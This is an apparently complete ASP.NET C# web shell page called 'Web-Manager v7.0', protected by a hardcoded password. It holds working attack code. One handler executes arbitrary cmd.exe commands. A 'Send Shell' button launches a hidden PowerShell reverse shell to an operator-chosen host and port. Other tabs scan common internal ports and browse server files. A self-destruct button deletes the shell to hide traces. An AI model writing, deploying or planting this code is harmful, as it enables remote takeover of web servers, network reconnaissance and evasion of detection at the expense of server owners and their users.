<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<script runat="server">
    string pass = "admin"; // Mot de passe d'accès

    protected void Page_Load(object sender, EventArgs e) {
        if (Session["auth"] == null) { LoginPanel.Visible = true; MainPanel.Visible = false; }
        else {
            LoginPanel.Visible = false; MainPanel.Visible = true;
            if (!IsPostBack) {
                lblPath.Text = Request.QueryString["path"] ?? Environment.CurrentDirectory;
                GetSysInfo();
                RefreshGrid();
                TabView.ActiveViewIndex = 0; // Défaut sur Dashboard
            }
        }
    }

    protected void btnLogin_Click(object sender, EventArgs e) {
        if (txtPass.Text == pass) { Session["auth"] = true; Response.Redirect(Request.RawUrl); }
    }

    private void GetSysInfo() {
        lblOS.Text = Environment.OSVersion.ToString();
        lblUser.Text = Environment.UserName;
        lblIP.Text = Request.ServerVariables["LOCAL_ADDR"] ?? "127.0.0.1";
    }

    // --- NAVIGATION ---
    protected void SetTab(object sender, EventArgs e) {
        Button btn = (Button)sender;
        TabView.ActiveViewIndex = int.Parse(btn.CommandArgument);
    }

    // --- TERMINAL & REVERSE SHELL ---
    protected void btnExecute_Click(object sender, EventArgs e) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + txtCmd.Text) {
                RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true
            };
            Process p = Process.Start(psi);
            txtResult.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        } catch (Exception ex) { txtResult.Text = "Error: " + ex.Message; }
    }

    protected void btnRevShell_Click(object sender, EventArgs e) {
        string payload = "$c=New-Object System.Net.Sockets.TCPClient('" + txtRevIP.Text + "'," + txtRevPort.Text + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()";
        try {
            Process.Start(new ProcessStartInfo("powershell.exe", "-nop -w hidden -c \"" + payload + "\"") { UseShellExecute = false, CreateNoWindow = true });
            msgTerminal.Text = "Reverse shell dispatched.";
        } catch (Exception ex) { msgTerminal.Text = ex.Message; }
    }

    // --- NETWORK MAPPING ---
    protected void btnScan_Click(object sender, EventArgs e) {
        txtNetResult.Text = "Mapping ports on " + txtNetTarget.Text + "...\n";
        int[] commonPorts = { 21, 22, 23, 80, 443, 445, 1433, 3306, 3389 };
        foreach (int port in commonPorts) {
            try {
                using (TcpClient client = new TcpClient()) {
                    if (client.BeginConnect(txtNetTarget.Text, port, null, null).AsyncWaitHandle.WaitOne(150))
                        txtNetResult.Text += "[+] " + port + " is OPEN\n";
                }
            } catch { }
        }
    }

    // --- FILE SYSTEM ---
    private void RefreshGrid() {
        try {
            DirectoryInfo di = new DirectoryInfo(lblPath.Text);
            gvFiles.DataSource = di.GetFileSystemInfos();
            gvFiles.DataBind();
        } catch { }
    }

    protected void btnSelfDestruct_Click(object sender, EventArgs e) {
        File.Delete(Request.PhysicalPath);
        Response.Write("Cleaned up."); Response.End();
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Web-Manager v7.0</title>
    <style>
        :root { --bg: #1e1e1e; --pnl: #252526; --acc: #007acc; --txt: #d4d4d4; --brd: #333; }
        body { background: var(--bg); color: var(--txt); font-family: 'Segoe UI', sans-serif; margin: 0; font-size: 13px; }
        .tabs-header { background: #2d2d2d; padding: 0 20px; border-bottom: 1px solid var(--brd); display: flex; }
        .tab-btn { background: none; border: none; color: #888; padding: 12px 20px; cursor: pointer; border-bottom: 2px solid transparent; transition: 0.2s; }
        .tab-btn:hover { color: #fff; background: #3e3e42; }
        .active-tab { color: #fff; border-bottom: 2px solid var(--acc); background: #3e3e42; }
        .content { padding: 25px; max-width: 1100px; margin: auto; }
        .panel { background: var(--pnl); border: 1px solid var(--brd); padding: 20px; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .console { background: #000; color: #4ec9b0; font-family: 'Consolas', monospace; width: 100%; height: 300px; border: 1px solid var(--brd); padding: 10px; margin-top: 10px; resize: none; }
        .input { background: #333; color: #fff; border: 1px solid var(--brd); padding: 8px; border-radius: 3px; }
        .btn-acc { background: var(--acc); color: #fff; border: none; padding: 8px 20px; cursor: pointer; border-radius: 3px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 10px; border-bottom: 1px solid var(--brd); text-align: left; }
        tr:hover td { background: #2d2d30; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <asp:Panel ID="LoginPanel" runat="server" style="text-align:center; padding-top:150px;">
            <div class="panel" style="display:inline-block; width:280px;">
                <h3 style="margin-top:0">Authorization</h3>
                <asp:TextBox ID="txtPass" runat="server" TextMode="Password" class="input" style="width:90%; margin-bottom:15px;"></asp:TextBox>
                <asp:Button ID="btnLogin" runat="server" Text="Connect" OnClick="btnLogin_Click" class="btn-acc" style="width:100%"/>
            </div>
        </asp:Panel>

        <asp:Panel ID="MainPanel" runat="server">
            <div class="tabs-header">
                <asp:Button runat="server" Text="Dashboard" CommandArgument="0" OnClick="SetTab" CssClass="tab-btn" />
                <asp:Button runat="server" Text="Explorer" CommandArgument="1" OnClick="SetTab" CssClass="tab-btn" />
                <asp:Button runat="server" Text="Terminal" CommandArgument="2" OnClick="SetTab" CssClass="tab-btn" />
                <asp:Button runat="server" Text="Network" CommandArgument="3" OnClick="SetTab" CssClass="tab-btn" />
                <asp:Button runat="server" Text="Database" CommandArgument="4" OnClick="SetTab" CssClass="tab-btn" />
            </div>

            <div class="content">
                <asp:MultiView ID="TabView" runat="server">
                    <asp:View runat="server">
                        <div class="panel">
                            <h3>System Overview</h3>
                            <p>OS: <b><asp:Label ID="lblOS" runat="server" /></b></p>
                            <p>User Context: <b><asp:Label ID="lblUser" runat="server" /></b></p>
                            <p>Local IP: <b><asp:Label ID="lblIP" runat="server" /></b></p>
                            <hr style="border:0; border-top:1px solid var(--brd); margin:20px 0;">
                            <asp:Button runat="server" Text="Self-Destruct (Delete Shell)" OnClick="btnSelfDestruct_Click" class="btn-acc" style="background:#cc3333" />
                        </div>
                    </asp:View>

                    <asp:View runat="server">
                        <div class="panel">
                            <h3>File Explorer</h3>
                            <p style="color:#888">Current Path: <asp:Label ID="lblPath" runat="server" style="color:#fff" /></p>
                            <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" GridLines="None">
                                <Columns>
                                    <asp:BoundField DataField="Name" HeaderText="Name" />
                                    <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" />
                                </Columns>
                            </asp:GridView>
                        </div>
                    </asp:View>

                    <asp:View runat="server">
                        <div class="panel">
                            <h3>Console & Reverse Connection</h3>
                            <asp:TextBox ID="txtCmd" runat="server" class="input" style="width:80%" placeholder="Enter command..."></asp:TextBox>
                            <asp:Button runat="server" Text="Execute" OnClick="btnExecute_Click" class="btn-acc" />
                            <asp:TextBox ID="txtResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true"></asp:TextBox>
                            
                            <div style="margin-top:20px; padding:15px; background:#2d2d2d; border-radius:4px;">
                                <b>Quick Reverse Shell:</b> &nbsp;
                                <asp:TextBox ID="txtRevIP" runat="server" class="input" placeholder="LHOST"></asp:TextBox>
                                <asp:TextBox ID="txtRevPort" runat="server" class="input" placeholder="LPORT" style="width:70px"></asp:TextBox>
                                <asp:Button runat="server" Text="Send Shell" OnClick="btnRevShell_Click" class="btn-acc" style="background:#ff8c00" />
                                <asp:Label ID="msgTerminal" runat="server" />
                            </div>
                        </div>
                    </asp:View>

                    <asp:View runat="server">
                        <div class="panel">
                            <h3>Network Mapping</h3>
                            <asp:TextBox ID="txtNetTarget" runat="server" class="input" Text="127.0.0.1"></asp:TextBox>
                            <asp:Button runat="server" Text="Scan Common Ports" OnClick="btnScan_Click" class="btn-acc" />
                            <asp:TextBox ID="txtNetResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true" style="height:200px; color:#ff8c00;"></asp:TextBox>
                        </div>
                    </asp:View>

                    <asp:View runat="server">
                        <div class="panel">
                            <h3>SQL Connection Tester</h3>
                            <asp:TextBox ID="txtSqlConn" runat="server" class="input" style="width:100%" placeholder="Data Source=server;Initial Catalog=db;User ID=user;Password=pass;"></asp:TextBox>
                            <br/><br/>
                            <asp:Button runat="server" Text="Test Connection" class="btn-acc" />
                        </div>
                    </asp:View>
                </asp:MultiView>
            </div>
        </asp:Panel>
    </form>
</body>
</html>